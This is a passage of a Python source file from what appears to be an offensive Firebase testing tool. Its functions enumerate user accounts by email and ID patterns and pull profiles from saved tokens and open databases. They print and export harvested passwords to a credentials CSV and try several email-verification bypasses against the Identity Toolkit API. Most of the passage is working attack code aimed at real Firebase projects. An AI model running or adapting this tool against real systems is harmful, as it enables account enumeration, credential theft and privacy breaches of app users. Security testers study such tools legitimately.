                email_file_to_check = input(f"{Colors.BOLD}[+] Enter the path to the email file: {Colors.ENDC}").strip()
                if not os.path.isfile(email_file_to_check):
                    print(f"{Colors.FAIL}[!] File not found: {email_file_to_check}{Colors.ENDC}")
                    email_file_to_check = None # Reset if file not found
            
            users = self._enumerate_common_emails(
                api_key, 
                single_email=single_email_to_check if enum_choice == "2" else None,
                email_file_path=email_file_to_check if enum_choice == "3" else None
            )
            all_users.extend(users)
            
        if choice == "3" or choice == "5":
            users = self._extract_from_database()
            all_users.extend(users)
            
        if choice == "4" or choice == "5":
            users = self._enumerate_user_ids(api_key)
            all_users.extend(users)
            
        if choice == "6":
            self._export_all_users()
            return
        
        # Mostrar resultados
        if all_users:
            self._display_extracted_users(all_users)
            self._save_extracted_users(all_users)
        else:
            print(f"{Colors.WARNING}[!] No users found with selected methods{Colors.ENDC}")

    def _extract_from_saved_tokens(self, api_key: str) -> List[Dict]:
            """Enhanced extraction from saved token files"""
            # Conditional import and use of glob
            users = []
            token_files = []
            try:
                import glob as local_glob
                token_files = local_glob.glob("firebase_*.json")
            except ImportError:
                print(f"{Colors.WARNING}[!] 'glob' module not available. Cannot search for saved token files.{Colors.ENDC}")
            
            if not token_files:
                print(f"{Colors.WARNING}[!] No saved token files found{Colors.ENDC}")
                return users
            
            print(f"{Colors.GREEN}[✓] Found {len(token_files)} token files{Colors.ENDC}")
            
            profile_endpoints = [
                f"https://identitytoolkit.googleapis.com/v1/accounts:lookup?key={api_key}",
                f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key={api_key}"
            ]
            
            for token_file in token_files:
                try:
                    with open(token_file, 'r') as f:
                        user_data = json.load(f)
                    
                    id_token = user_data.get('id_token', '')
                    if not id_token:
                        continue
                    
                    print(f"{Colors.CYAN}[*] Extracting from: {token_file}{Colors.ENDC}")
                    
                    for endpoint in profile_endpoints:
                        try:
                            profile_data = {"idToken": id_token}
                            response = self.session.post(endpoint, json=profile_data, timeout=10)
                            
                            if response.status_code == 200:
                                profile_info = response.json()
                                
                                for user in profile_info.get('users', []):
                                    user_details = {
                                        'extraction_method': 'saved_tokens',
                                        'user_id': user.get('localId', 'Unknown'),
                                        'email': user.get('email', 'Unknown'),
                                        'email_verified': user.get('emailVerified', False),
                                        'display_name': user.get('displayName', 'None'),
                                        'photo_url': user.get('photoUrl', 'None'),
                                        'phone_number': user.get('phoneNumber', 'None'),
                                        'created_at': user.get('createdAt', 'Unknown'),
                                        'last_login': user.get('lastLoginAt', 'Unknown'),
                                        'last_refresh': user.get('lastRefreshAt', 'Unknown'),
                                        'disabled': user.get('disabled', False),
                                        'custom_attributes': user.get('customAttributes', 'None'),
                                        'provider_data': user.get('providerUserInfo', []),
                                        'token_file': token_file,
                                        'password': user_data.get('password', 'Unknown'),
                                        'id_token': id_token[:20] + '...',
                                        'refresh_token': user_data.get('refresh_token', 'Unknown')[:20] + '...' if user_data.get('refresh_token') else 'None'
                                    }
                                    users.append(user_details)
                                    
                                    print(f"{Colors.GREEN}[✓] User: {user_details['email']} (Verified: {user_details['email_verified']}){Colors.ENDC}")
                                
                                break  # Success, no need to try other endpoints
                                
                        except Exception as e:
                            continue
                            
                except Exception as e:
                    print(f"{Colors.FAIL}[!] Error processing {token_file}: {e}{Colors.ENDC}")
            
            return users

    def _display_extracted_users(self, users: List[Dict]) -> None:
        """Display extracted users in organized format"""
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════╗")
        print(f"║           EXTRACTED USERS REPORT         ║")
        print(f"╚══════════════════════════════════════════╝{Colors.ENDC}")
        
        if not users:
            print(f"{Colors.WARNING}[!] No users extracted{Colors.ENDC}")
            return
        
        # Group by extraction method
        methods = {}
        for user in users:
            method = user.get('extraction_method', 'unknown')
            if method not in methods:
                methods[method] = []
            methods[method].append(user)
        
        print(f"\n{Colors.BOLD}SUMMARY:{Colors.ENDC}")
        print(f"Total Users Found: {len(users)}")
        
        for method, method_users in methods.items():
            print(f"  • {method}: {len(method_users)} users")
        
        # Display detailed information
        for method, method_users in methods.items():
            print(f"\n{Colors.CYAN}{'='*50}")
            print(f"{method.upper().replace('_', ' ')} ({len(method_users)} users)")
            print(f"{'='*50}{Colors.ENDC}")
            
            for i, user in enumerate(method_users, 1):
                print(f"\n{Colors.GREEN}[{i}] User Details:{Colors.ENDC}")
                
                # Display key information first
                key_fields = ['email', 'user_id', 'display_name', 'email_verified', 'password']
                for field in key_fields:
                    if field in user and user[field] not in [None, 'None', 'Unknown']:
                        color = Colors.FAIL if field == 'password' else Colors.WHITE
                        print(f"    {color}{field}: {user[field]}{Colors.ENDC}")
                
                # Display other fields
                for key, value in user.items():
                    if key not in key_fields and key != 'extraction_method' and value not in [None, 'None', 'Unknown', '']:
                        if isinstance(value, list) and len(value) > 0:
                            print(f"    {key}: {len(value)} items")
                        elif isinstance(value, dict):
                            print(f"    {key}: {len(value)} fields")
                        else:
                            print(f"    {key}: {value}")
        
        # Show credentials summary
        cred_users = [u for u in users if u.get('password') and u.get('password') != 'Unknown']
        if cred_users:
            print(f"\n{Colors.FAIL}🚨 CREDENTIALS FOUND! 🚨{Colors.ENDC}")
            print(f"{Colors.FAIL}Users with extracted passwords: {len(cred_users)}{Colors.ENDC}")
            
            for user in cred_users:
                print(f"  • {user.get('email', 'Unknown')}: {user.get('password', 'Unknown')}")

    def _export_all_users(self) -> None:
        """Export all users from all available token files"""
        import glob
        
        print(f"\n{Colors.CYAN}[*] Exporting All User Data{Colors.ENDC}")
        
        token_files = glob.glob("firebase_*.json")
        
        if not token_files:
            print(f"{Colors.WARNING}[!] No token files found to export{Colors.ENDC}")
            return
        
        all_user_data = []
        
        for token_file in token_files:
            try:
                with open(token_file, 'r') as f:
                    user_data = json.load(f)
                    
                # Add file source
                user_data['source_file'] = token_file
                all_user_data.append(user_data)
                
            except Exception as e:
                print(f"{Colors.FAIL}[!] Error reading {token_file}: {e}{Colors.ENDC}")
        
        if all_user_data:
            timestamp = int(time.time())
            export_filename = f"firebase_all_users_export_{timestamp}.json"
            
            with open(export_filename, 'w') as f:
                json.dump(all_user_data, f, indent=2)
            
            print(f"{Colors.GREEN}[✓] Exported {len(all_user_data)} user records to: {export_filename}{Colors.ENDC}")
        else:
            print(f"{Colors.WARNING}[!] No user data to export{Colors.ENDC}")

    def _test_email_verification_bypass(self, api_key: str) -> None: # New simplified version
        """Comprehensive test for email verification bypass, using existing or new user."""
        print(f"\n{Colors.CYAN}[*] Comprehensive Email Verification Bypass Testing{Colors.ENDC}")
        
        print("1. Test with an existing user (provide email and ID token)")
        print("2. Create a new user for testing")
        choice = input(f"{Colors.BOLD}[+] Select option (1-2): {Colors.ENDC}").strip()

        user_email, id_token = None, None
        if choice == "1":
            user_email = input(f"{Colors.BOLD}[+] Enter existing user's email: {Colors.ENDC}").strip()
            id_token = input(f"{Colors.BOLD}[+] Enter existing user's ID Token: {Colors.ENDC}").strip()
            if not user_email or not id_token:
                print(f"{Colors.FAIL}[!] Email and ID Token are required for existing user testing.{Colors.ENDC}")
                return
        elif choice == "2":
            # New user creation handled by _test_email_verification_bypass_existing
            pass
        else:
            print(f"{Colors.FAIL}[!] Invalid option.{Colors.ENDC}")
            return
            
        self._test_email_verification_bypass_existing(api_key, user_email, id_token)

    def _get_user_profile(self, id_token: str, api_key: str) -> Optional[Dict]:
        """Helper function to get user profile using an ID token."""
        lookup_url = self.IDENTITY_TOOLKIT_LOOKUP_ENDPOINT_TEMPLATE.format(api_key=api_key)
        response = self._make_request('POST', lookup_url, json={"idToken": id_token})
        
        if response and response.status_code == 200:
            try:
                profile_data = response.json()
                if profile_data.get("users"):
                    return profile_data["users"][0]
                else:
                    print(f"{Colors.YELLOW}[i] User data not found in profile response for token.{Colors.ENDC}")
            except json.JSONDecodeError:
                print(f"{Colors.FAIL}[!] Failed to decode user profile JSON response: {response.text[:100]}{Colors.ENDC}")
        elif response:
            print(f"{Colors.FAIL}[!] Error fetching user profile: {response.status_code} - {response.text[:100]}{Colors.ENDC}")
        # If response is None, _make_request already printed the error.
        return None

    def _perform_bypass_tests(self, id_token: str, email: str, user_id: str, api_key: str) -> Tuple[List[str], Optional[str]]:
        """Helper function to perform various bypass tests on a user."""
        successful_bypasses = []
        current_id_token = id_token

        # Test bypass methods (similar to the old _test_email_verification_bypass)
        # These internal methods (_try_direct_verification_bypass etc.) are assumed to exist or be added.
        # For this integration, we are focusing on the structure.
        bypass_methods_map = [
            ("Direct Verification Toggle", lambda t, e, k: self._try_direct_verification_bypass(t, e, k)), # Pass correct args
            ("Profile Update Bypass", lambda t, e, k: self._try_profile_update_bypass(t, e, k)),
            # ("Custom Claims Bypass", self._try_custom_claims_bypass), # Needs UID, more complex
            # ("Admin SDK Bypass", self._try_admin_sdk_bypass), # Needs more context
            # ("Provider Linking Bypass", self._try_provider_bypass)
        ]

        for method_name, method_func in bypass_methods_map:
            print(f"\n{Colors.CYAN}[*] Testing: {method_name}{Colors.ENDC}")
            try:
                # Ensure the lambda calls the method with the current_id_token, email, and api_key
                result = method_func(current_id_token, email, api_key) 
                if result.get('success'):
                    print(f"{Colors.GREEN}[+] SUCCESS: {method_name} - {result.get('details', '')}{Colors.ENDC}")
                    successful_bypasses.append(method_name)
                    if result.get('new_token'):
                        current_id_token = result['new_token']
                        print(f"{Colors.YELLOW}[i] ID Token updated by {method_name}{Colors.ENDC}")
                else:
                    print(f"{Colors.FAIL}[-] FAILED: {method_name} - {result.get('error', 'No error details')}{Colors.ENDC}")
            except Exception as e:
                print(f"{Colors.FAIL}[!] EXCEPTION in {method_name}: {e}{Colors.ENDC}")
        
        return successful_bypasses, current_id_token

    def _test_email_verification_bypass_existing(self, api_key: str, user_email: Optional[str] = None, id_token: Optional[str] = None) -> None:
        """Core logic for testing email verification bypass, using existing or new user."""
        
        original_id_token = id_token # Keep a copy of the initial token if provided

        if not id_token: # Create a new user if no token provided
            test_email_default = f"bypass_test_{int(time.time())}@evil.com"
            user_email_input = input(f"{Colors.BOLD}[+] Enter email for new test user (default: {test_email_default}): {Colors.ENDC}").strip()
            user_email = user_email_input if user_email_input else test_email_default
            
            test_password = input(f"{Colors.BOLD}[+] Enter test password (default: BypassTest123!): {Colors.ENDC}").strip()
            if not test_password:
                test_password = "BypassTest123!"

            print(f"\n{Colors.CYAN}[*] Creating user: {user_email} for bypass testing...{Colors.ENDC}")
            user_data = self._create_test_user(user_email, test_password, api_key) # Assumes _create_test_user
            if not user_data or 'idToken' not in user_data:
                print(f"{Colors.FAIL}[!] Could not create test user. Aborting bypass test.{Colors.ENDC}")
                return
            id_token = user_data['idToken']
            original_id_token = id_token # Store the token of the newly created user
            print(f"{Colors.GREEN}[✓] Test user {user_email} created successfully.{Colors.ENDC}")
        
        # Get user profile to check current verification status
        profile = self._get_user_profile(id_token, api_key)
        if not profile:
            print(f"{Colors.FAIL}[!] Could not retrieve profile for user {user_email}. Aborting.{Colors.ENDC}")
            return

        user_id = profile.get('localId')
        email_verified_initial = profile.get('emailVerified', False)
        user_email = profile.get('email', user_email) # Update email from profile if possible

        print(f"\n{Colors.CYAN}[*] Initial status for {user_email} (User ID: {user_id}):{Colors.ENDC}")
        print(f"    Email Verified: {Colors.GREEN if email_verified_initial else Colors.FAIL}{email_verified_initial}{Colors.ENDC}")

        if email_verified_initial:
            print(f"{Colors.WARNING}[!] Email is already verified. Bypass might not be meaningful, but testing anyway.{Colors.ENDC}")

        successful_bypasses, current_id_token = self._perform_bypass_tests(id_token, user_email, user_id, api_key)
        
        # Final check of verification status
        print(f"\n{Colors.CYAN}[*] Re-checking email verification status for {user_email}...{Colors.ENDC}")
        final_profile = self._get_user_profile(current_id_token if current_id_token else id_token, api_key)
        email_verified_final = False
        if final_profile:
            email_verified_final = final_profile.get('emailVerified', False)
            print(f"    Email Verified (after tests): {Colors.GREEN if email_verified_final else Colors.FAIL}{email_verified_final}{Colors.ENDC}")
        else:
            print(f"{Colors.FAIL}[!] Could not retrieve final profile for {user_email}.{Colors.ENDC}")

        # Summary
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════╗")
        print(f"║ EMAIL VERIFICATION BYPASS TEST SUMMARY   ║")
        print(f"╚══════════════════════════════════════════╝{Colors.ENDC}")
        print(f"Target User: {user_email} (ID: {user_id})")
        print(f"Initial Verification Status: {email_verified_initial}")
        print(f"Final Verification Status: {email_verified_final}")
        
        if successful_bypasses:
            print(f"{Colors.FAIL}Successful Bypass Methods ({len(successful_bypasses)}):{Colors.ENDC}")
            for bypass in successful_bypasses:
                print(f"  - {bypass}")
        else:
            print(f"{Colors.GREEN}No direct bypass methods were successful.{Colors.ENDC}")

        if email_verified_final and not email_verified_initial:
            print(f"{Colors.FAIL}🚨 OVERALL BYPASS ACHIEVED: Email status changed from unverified to verified!{Colors.ENDC}")
        elif email_verified_final:
            print(f"{Colors.GREEN}Email remains verified (or was already verified).{Colors.ENDC}")
        else:
            print(f"{Colors.YELLOW}Email remains unverified.{Colors.ENDC}")

        # Offer cleanup only if a new user was created as part of this specific test run
        if not id_token and original_id_token : # original_id_token refers to newly created user's token
             if input(f"\n{Colors.BOLD}[?] Delete the test user '{user_email}'? (Y/n): {Colors.ENDC}").lower() != 'n':
                if self._delete_test_user(original_id_token, api_key): # Assumes _delete_test_user
                    print(f"{Colors.GREEN}[✓] Test user {user_email} deleted.{Colors.ENDC}")
                else:
                    print(f"{Colors.FAIL}[!] Failed to delete test user {user_email}.{Colors.ENDC}")
    
    # Note: _create_test_user, _try_direct_verification_bypass, _try_profile_update_bypass etc.
    # are assumed to be defined elsewhere in the class or need to be added if they are new.
    # For this step, we are focusing on integrating the main provided functions.

    def _create_test_user(self, email: str, password: str, api_key: str) -> Optional[Dict]:
        """Create a test user for bypass testing"""
        signup_endpoint = self.IDENTITY_TOOLKIT_SIGNUP_ENDPOINT_TEMPLATE.format(api_key=api_key)
        
        signup_data = {
            "email": email,
            "password": password,
            "returnSecureToken": True
        }
        
        try:
            response = self.session.post(signup_endpoint, json=signup_data, timeout=10)
            
            if response.status_code == 200:
                return response.json()
            else:
                print(f"    Error creating test user: {response.status_code}")
                return None
                
        except Exception as e:
            print(f"    Exception creating test user: {e}")
            return None

    def _try_direct_verification_bypass(self, id_token: str, email: str, api_key: str) -> Dict:
        """Try to directly toggle email verification status"""
        update_endpoint = self.IDENTITY_TOOLKIT_UPDATE_ENDPOINT_TEMPLATE.format(api_key=api_key)
        
        update_data = {
            "idToken": id_token,
            "emailVerified": True,
            "returnSecureToken": True # Explicitly ask for token
        }
        
        response = self._make_request('POST', update_endpoint, json=update_data, timeout=10)
            
        if response and response.status_code == 200:
            try:
                updated_user = response.json()
                is_verified = updated_user.get('emailVerified', False)
                
                return {
                    'success': is_verified,
                    'details': f'Email verification toggled to: {is_verified}',
                    'new_token': updated_user.get('idToken')
                }
            except json.JSONDecodeError:
                return {'success': False, 'error': f'Failed to decode JSON response: {response.text[:100]}'}
        elif response:
            return {
                'success': False,
                'error': f"HTTP {response.status_code}: {response.text[:100]}"
            }
        # If response is None, _make_request handled printing.
        return {'success': False, 'error': 'Request failed, no response from server.'}

    def _try_profile_update_bypass(self, id_token: str, email: str, api_key: str) -> Dict:
        """Try to bypass verification through profile updates"""
        update_endpoint = self.IDENTITY_TOOLKIT_UPDATE_ENDPOINT_TEMPLATE.format(api_key=api_key)
        
        # Try various profile update combinations
        update_attempts = [
            {"displayName": "Verified User", "emailVerified": True},
            {"photoUrl": "https://example.com/photo.jpg", "emailVerified": True},
            {"displayName": "Admin", "customAttributes": '{"verified": true}'},
            {"email": email, "emailVerified": True}
        ]
        
        for attempt in update_attempts:
            update_data = {"idToken": id_token, "returnSecureToken": True}
            update_data.update(attempt)
            
            response = self._make_request('POST', update_endpoint, json=update_data, timeout=5)
            
            if response and response.status_code == 200:
                try:
                    updated_user = response.json()
                    if updated_user.get('emailVerified'):
                        return {
                            'success': True,
                            'details': f'Profile update bypass successful with: {attempt}',
                            'new_token': updated_user.get('idToken')
                        }
                except json.JSONDecodeError:
                    # Log error but continue trying other attempts
                    print(f"{Colors.WARNING}[!] Failed to decode JSON on profile update attempt: {response.text[:100]}{Colors.ENDC}")
                    continue 
            # If response is None or status is not 200, continue to next attempt
        
        return {
            'success': False,
            'error': 'All profile update attempts failed or returned non-200 status.'
        }

    def _try_custom_claims_bypass(self, id_token: str, email: str, api_key: str) -> Dict: # Marked for base64 import review
        """Try to set custom claims for verification bypass"""
        if not self.project_id: 
             return {'success': False, 'error': 'Project ID not set, cannot test custom claims.'}
        claims_endpoint = self.IDENTITY_TOOLKIT_SET_CUSTOM_CLAIMS_ENDPOINT_TEMPLATE.format(project_id=self.project_id, api_key=api_key)
        
        try:
            # Decode JWT payload (not secure, just for UID extraction)
            parts = id_token.split('.')
            if len(parts) > 1:
                payload = base64.b64decode(parts[1] + '==')
                token_data = json.loads(payload)
                user_id = token_data.get('user_id', 'unknown')
            else:
                user_id = 'unknown'
        except:
            user_id = 'unknown'
        
        custom_claims_attempts = [
            {"email_verified": True},
            {"verified": True},
            {"admin": True},
            {"bypass_verification": True},
            {"role": "admin", "verified": True}
        ]
        
        for claims in custom_claims_attempts:
            try:
                claims_data = { # This endpoint requires 'uid' which is the Firebase user ID (localId)
                    "localId": user_id, # Changed from "uid" to "localId" if that's what Firebase expects here for non-admin SDK calls
                    "customUserAttributes": json.dumps(claims) # Firebase expects customAttributes as a JSON string
                }
                # Note: The actual Identity Toolkit API for setting custom claims by a user (non-admin)
                # is usually done via "accounts:update" with "customAttributes" field.
                # The "setCustomUserClaims" is typically an Admin SDK function.
                # This function might be conceptually flawed if it's trying to use a user token for an admin action.
                # For now, assuming it's trying a user-level update that might indirectly set claims.
                # Re-checking the endpoint: IDENTITY_TOOLKIT_SET_CUSTOM_CLAIMS_ENDPOINT_TEMPLATE uses projects/{project_id}:setCustomUserClaims
                # This IS an admin-level action, so it should not work with a user's ID token.
                # However, the original code was trying self.session.post.
                # I will keep the structure but note this endpoint is unlikely to work with user tokens.
                
                response = self._make_request('POST', claims_endpoint, json=claims_data, timeout=5) # Using _make_request
                
                if response and response.status_code == 200:
                    # This success is highly unlikely with a user token for this admin endpoint.
                    return {
                        'success': True,
                        'details': f'Custom claims set (or attempted): {claims}',
                        'claims_sent': claims
                    }
                # No explicit error print here if it fails, as it's expected to fail mostly.
            except Exception as e: # General exception for network or JSON issues
                print(f"{Colors.WARNING}[!] Exception during custom claims attempt for {claims}: {e}{Colors.ENDC}")
                continue
        
        return {
            'success': False,
            'error': 'All custom claims attempts failed or were not applicable/authorized.'
        }

    def _try_admin_sdk_bypass(self, id_token: str, email: str, api_key: str) -> Dict:
        """Try to use Admin SDK endpoints for bypass (conceptual test with user token)"""
        if not self.project_id: 
            return {'success': False, 'error': 'Project ID not set, cannot test admin SDK bypass.'}

        # These would typically be different endpoints or require different auth (Admin SDK)
        # For now, using placeholder templates if they were defined, or constructing them.
        # This part of the code seems more conceptual for a client-side tool.
        # Assuming PROJECT_SPECIFIC_UPDATE_ENDPOINT_TEMPLATE and PROJECT_BATCH_UPDATE_ENDPOINT_TEMPLATE would be defined if used.
        # For this example, I'll construct them based on common patterns if not already constants.
        project_update_endpoint = f"https://identitytoolkit.googleapis.com/v1/projects/{self.project_id}/accounts:update?key={api_key}"
        project_batch_update_endpoint = f"https://firebase.googleapis.com/v1/projects/{self.project_id}/accounts:batchUpdate?key={api_key}"
        
        admin_endpoints_to_try = [project_update_endpoint, project_batch_update_endpoint]
        
        for endpoint_url_template in admin_endpoints_to_try: # Renamed for clarity
            # These are admin-level endpoints and are not expected to work with a user's ID token.
            # This test is more conceptual to see if any misconfiguration allows it.
            admin_payload = { # Renamed from admin_data
                "idToken": id_token, # Still sending user's token, though endpoint might ignore/reject
                "users": [{
                    "localId": id_token.split('.')[1], # Placeholder for user ID, not correct for batchUpdate
                    "email": email,
                    "emailVerified": True
                }]
            }
            if "accounts:batchUpdate" in endpoint_url_template: # Batch update has a different structure
                 admin_payload = {
                     "idToken": id_token, 
                     "targetProjectId": self.project_id, 
                     "users": [{"localId": id_token.split('.')[1], "emailVerified": True}] # Simplified
                 }
            
            response = self._make_request('POST', endpoint_url_template, json=admin_payload, timeout=5) # Using _make_request
            
            if response and response.status_code == 200:
                # Highly unlikely to succeed with user token.
                return {
                    'success': True,
                    'details': f'Admin SDK-like endpoint test succeeded via: {endpoint_url_template}',
                    'endpoint': endpoint_url_template
                }
            # No explicit error print, as failure is expected.
        
        return {
            'success': False,
            'error': 'Admin SDK-like endpoint tests did not succeed (as expected with user token).'
        }

    def _try_provider_bypass(self, id_token: str, email: str, api_key: str) -> Dict:
        """Try to bypass verification by linking external providers"""
        if not self.project_id: 
            return {'success': False, 'error': 'Project ID not set, cannot test provider linking.'}

        link_endpoint_url = self.IDENTITY_TOOLKIT_LINK_WITH_OAUTH_ENDPOINT_TEMPLATE.format(api_key=api_key) # Renamed
        
        # Simulate provider linking attempts
        # The requestUri should ideally be a real URL associated with the Firebase project
        base_request_uri = self.FIREBASE_APP_URL_BASE_TEMPLATE.format(project_id=self.project_id) 
        providers = [
            {"providerId": "google.com", "requestUri": base_request_uri},
            {"providerId": "facebook.com", "requestUri": base_request_uri},
            {"providerId": "github.com", "requestUri": base_request_uri}
        ]
        
        for provider in providers:
            try:
                link_payload = { # Renamed from link_data
                    "idToken": id_token,
                    "returnSecureToken": True,
                    **provider # Spread provider details
                }
                
                response = self._make_request('POST', link_endpoint_url, json=link_payload, timeout=5) # Using _make_request
                
                if response and response.status_code == 200:
                    try:
                        linked_user = response.json()
                        if linked_user.get('emailVerified'):
                            return {
                                'success': True,
                                'details': f'Provider linking bypass with: {provider["providerId"]}',
                                'provider': provider["providerId"],
                                'new_token': linked_user.get('idToken')
                            }
                    except json.JSONDecodeError:
                        print(f"{Colors.WARNING}[!] Failed to decode JSON on provider linking attempt: {response.text[:100]}{Colors.ENDC}")
                        continue # To next provider
            except Exception as e: # General exception
                print(f"{Colors.WARNING}[!] Exception during provider linking attempt for {provider.get('providerId', 'Unknown')}: {e}{Colors.ENDC}")
                continue
        
        return {
            'success': False,
            'error': 'All provider linking bypass attempts failed or were not applicable.'
        }

    def _test_account_deletion_unverified(self, id_token: str, api_key: str) -> bool:
        """Test if account can be deleted without verification (conceptual, usually needs verification or is admin action)"""
        # This is a destructive test. The original code returned False.
        # For safety in an automated tool, it's better to not perform actual deletion
        # without very explicit user confirmation beyond a simple Y/N for this specific test.
        # The _delete_account_test in _interactive_modification already handles user-confirmed deletion.
        print(f"{Colors.YELLOW}[i] Conceptual test: Account deletion for unverified users is typically restricted.{Colors.ENDC}")
        print(f"{Colors.YELLOW}[i] Actual deletion can be attempted via the 'Test Account Deletion' option in 'Test Account Modification/Takeover' menu.{Colors.ENDC}")
        return False # Placeholder, as actual deletion is risky here.

    def _delete_test_user(self, id_token: str, api_key: str) -> bool:
        """Delete test user for cleanup (used by other functions)."""
        delete_endpoint = self.IDENTITY_TOOLKIT_DELETE_ENDPOINT_TEMPLATE.format(api_key=api_key)
        delete_payload = {"idToken": id_token} # Renamed from delete_data
        response = self._make_request('POST', delete_endpoint, json=delete_payload, timeout=5) # Using _make_request
        return response is not None and response.status_code == 200

    def _test_password_change_unverified(self, id_token: str, api_key: str) -> bool:
        """Test password change without email verification (conceptual)."""
        # Actual password change is usually allowed for a logged-in user regardless of email verification.
        # This test is more about whether the *state* of being unverified blocks this common action.
        print(f"{Colors.YELLOW}[i] Conceptual test: Password changes for logged-in users are generally allowed, irrespective of email verification.{Colors.ENDC}")
        print(f"{Colors.YELLOW}[i] Actual password modification can be tested via 'Test Account Modification/Takeover' menu.{Colors.ENDC}")
        # To make this a real test, we would call _modify_password, but that's interactive.
        # For a non-interactive check here, we could try a direct API call if a fixed new password was used.
        # update_endpoint = self.IDENTITY_TOOLKIT_UPDATE_ENDPOINT_TEMPLATE.format(api_key=api_key)
        # change_payload = {"idToken": id_token, "password": "NewPasswordForTest123!", "returnSecureToken": True}
        # response = self._make_request('POST', update_endpoint, json=change_payload, timeout=5)
        # return response is not None and response.status_code == 200
        return True # Assuming it's allowed, as is typical.

    def _test_database_access_unverified(self, id_token: str) -> bool:
        """Test database access without email verification."""
        # This depends heavily on database rules, not just email verification status.
        if not self.project_id:
            print(f"{Colors.WARNING}[!] Project ID not set, cannot test database access.{Colors.ENDC}")
            return False
            
        db_url_to_test = f"https://{self.project_id}-default-rtdb.firebaseio.com/scanner_unverified_test.json"
        headers = {'Authorization': f'Bearer {id_token}'}
        
        # Try read
        print(f"{Colors.CYAN}[*] Testing DB read access for unverified user at: {db_url_to_test}{Colors.ENDC}")
        response_read = self._make_request('GET', db_url_to_test, headers=headers, timeout=5)
        if response_read and response_read.status_code == 200:
            print(f"{Colors.GREEN}[✓] Unverified user can read from DB path (might be intended or misconfiguration).{Colors.ENDC}")
            # This doesn't automatically mean a vulnerability without knowing rules, but it's an access capability.
            # return True # Let's also check write
        
        # Try write
        print(f"{Colors.CYAN}[*] Testing DB write access for unverified user at: {db_url_to_test}{Colors.ENDC}")
        test_data = {'unverified_user_test_write': True, 'timestamp': time.time()}
        response_write = self._make_request('PUT', db_url_to_test, json=test_data, headers=headers, timeout=5)
        if response_write and response_write.status_code == 200:
            print(f"{Colors.GREEN}[✓] Unverified user can write to DB path (might be intended or misconfiguration).{Colors.ENDC}")
            self._make_request('DELETE', db_url_to_test, headers=headers, timeout=3) # Cleanup
            return True # Write success is a strong indicator of potential issue if not intended
            
        print(f"{Colors.YELLOW}[i] Database access (read/write) for unverified user seems restricted or path is not available under these conditions.{Colors.ENDC}")
        return False

    def _test_profile_access(self, id_token: str, access_type: str, api_key: str) -> bool:
        """Test profile read/write access with unverified account."""
        # Profile read/write for one's own account is generally allowed regardless of email verification.
        print(f"{Colors.YELLOW}[i] Conceptual test: Profile {access_type} for one's own account is typically allowed for logged-in users.{Colors.ENDC}")
        # endpoint = ""
        # payload = {}
        # if access_type == 'read':
        #     endpoint = self.IDENTITY_TOOLKIT_LOOKUP_ENDPOINT_TEMPLATE.format(api_key=api_key)
        #     payload = {"idToken": id_token}
        # else:  # write
        #     endpoint = self.IDENTITY_TOOLKIT_UPDATE_ENDPOINT_TEMPLATE.format(api_key=api_key)
        #     payload = {"idToken": id_token, "displayName": f"UnverifiedTest_{int(time.time())}", "returnSecureToken": True}
        
        # response = self._make_request('POST', endpoint, json=payload, timeout=5)
        # return response is not None and response.status_code == 200
        return True # Assuming it's allowed.

    def _save_extracted_users(self, users: List[Dict]) -> None:
        """Save extracted users to file with different format options"""
        if not users:
            return
            
        timestamp = int(time.time())
        
        # Save detailed JSON
        json_filename = f"firebase_users_extracted_{timestamp}.json"
        with open(json_filename, 'w') as f:
            json.dump(users, f, indent=2)
        print(f"\n{Colors.GREEN}[✓] Detailed report saved to: {json_filename}{Colors.ENDC}")
        
        # Save credentials CSV
        cred_users = [u for u in users if u.get('email') and u.get('password') and u.get('password') != 'Unknown']
        if cred_users:
            csv_filename = f"firebase_credentials_{timestamp}.csv"
            with open(csv_filename, 'w') as f:
                f.write("email,password,user_id,verified,source\n")
                for user in cred_users:
                    f.write(f"{user.get('email', '')},{user.get('password', '')},{user.get('user_id', '')},{user.get('email_verified', False)},{user.get('extraction_method', '')}\n")
            print(f"{Colors.GREEN}[✓] Credentials saved to: {csv_filename}{Colors.ENDC}")
        
        # Save simple list
        emails = [u.get('email') for u in users if u.get('email') and '@' in u.get('email', '')]
        if emails:
            list_filename = f"firebase_emails_{timestamp}.txt"
            with open(list_filename, 'w') as f:
                for email in sorted(set(emails)):
                    f.write(f"{email}\n")
            print(f"{Colors.GREEN}[✓] Email list saved to: {list_filename}{Colors.ENDC}")

    def _enumerate_user_ids(self, api_key: str) -> List[Dict]:
        """Attempt to enumerate users by trying common User ID patterns"""
        print(f"\n{Colors.CYAN}[*] Enumerating User IDs{Colors.ENDC}")
        
        users = []
        
        
        lookup_endpoint = self.IDENTITY_TOOLKIT_LOOKUP_ENDPOINT_TEMPLATE.format(api_key=api_key)
        
        print(f"{Colors.CYAN}[*] Testing {len(self.COMMON_USER_ID_PATTERNS)} User ID patterns...{Colors.ENDC}")
        
        for user_id in self.COMMON_USER_ID_PATTERNS:
            try:
                # Try lookup by localId
                lookup_data = {"localId": [user_id]}
                
                response = self.session.post(lookup_endpoint, json=lookup_data, timeout=5)
                
                if response.status_code == 200:
                    profile_info = response.json()
                    
                    for user in profile_info.get('users', []):
                        user_details = {
                            'extraction_method': 'user_id_enumeration',
                            'user_id': user.get('localId'),
                            'email': user.get('email'),
                            'email_verified': user.get('emailVerified'),
                            'display_name': user.get('displayName'),
                            'created_at': user.get('createdAt'),
                            'last_login': user.get('lastLoginAt'),
                            'pattern_matched': user_id
                        }
                        users.append(user_details)
                        print(f"{Colors.GREEN}[+] Found user by ID: {user_id} -> {user.get('email', 'No email')}{Colors.ENDC}")
                        
            except Exception as e:
                continue
                
            time.sleep(0.2)  # Small delay
        
        return users

    def _extract_from_database(self) -> List[Dict]:
        """Enhanced database extraction with better URL construction"""
        print(f"\n{Colors.CYAN}[*] Extracting Users from Open Databases{Colors.ENDC}")
        
        users = []
        
        if not self.project_id:
            print(f"{Colors.WARNING}[!] Project ID needed for database extraction{Colors.ENDC}")
            return users
        
        # Build proper Firebase RTDB URLs using templates
        db_urls_to_test = []
        
        # Use the existing templates but fix the URL construction
        for template in self.RTDB_URL_TEMPLATES:
            db_base_url = template.format(project_id=self.project_id)
            if not db_base_url.endswith('/'):
                db_base_url += '/'
            db_urls_to_test.append(db_base_url)
        
        # Add specific database URL if known
        if self.database_url:
            db_base_url = self.database_url
            if not db_base_url.endswith('/'):
                db_base_url += '/'
            db_urls_to_test.insert(0, db_base_url)
        
